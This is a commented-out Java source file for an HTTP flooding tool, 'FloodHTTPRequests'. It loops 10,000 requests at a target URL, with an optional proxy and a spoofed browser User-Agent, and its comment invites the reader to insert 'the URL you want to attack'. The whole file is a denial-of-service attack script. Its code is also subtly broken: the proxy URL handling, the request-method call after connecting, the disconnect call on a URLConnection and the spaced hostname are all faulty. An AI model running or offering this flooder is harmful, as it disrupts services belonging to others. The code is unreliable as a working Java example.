//import java.io.IOException;
//import java.net.HttpURLConnection;
//import java.net.InetSocketAddress;
//import java.net.Proxy;
//import java.net.URL;
//import java.net.URLConnection;
//
//public class FloodHTTPRequests {
//  public static void main(String[] args) throws IOException {
//    String targetURL = "http://www.example.com";  // Replace with the URL you want to attack
//
//    int numRequests = 10000;  // Number of requests to send
//    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("proxy. example. com", 80));  // Optional - use a proxy server
//
//    for (int i = 0; i < numRequests; i++) {
//      URLConnection connection = null;
//      try {
//        connection = proxy == null ? new URL(targetURL).openConnection() : new URL(proxy.toString()).openConnection(proxy);
//
//        connection.setRequestProperty("Accept", "*/*");
//        connection.setRequestProperty("Accept-Charset", "utf-8;q=0.5,*;q=0.4");
//        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.3");
//        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
//
//        // Send the request
//        connection.connect();
//
//        if (connection instanceof HttpURLConnection) {
//          ((HttpURLConnection) connection).setDoOutput(true);
//          ((HttpURLConnection) connection).setRequestMethod("GET");
//        }
//
//        // Close the connection
//        connection.disconnect();
//      } catch (IOException e) {
//        System.out.println("Error: " + e.getMessage());
//      }
//    }
//  }
//}
